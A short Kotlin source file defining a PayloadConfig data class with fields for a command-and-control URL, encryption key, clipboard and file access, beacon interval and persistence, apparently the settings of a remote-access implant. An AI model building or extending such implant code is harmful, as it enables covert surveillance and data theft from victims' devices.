package com.anonymousbeta.lakey.payload

data class PayloadConfig(
    val c2Url: String,
    val encryptionKey: String,
    val enableFileAccess: Boolean = true,
    val enableClipboard: Boolean = true,
    val beaconIntervalSeconds: Int = 30,
    val persistence: Boolean = true
)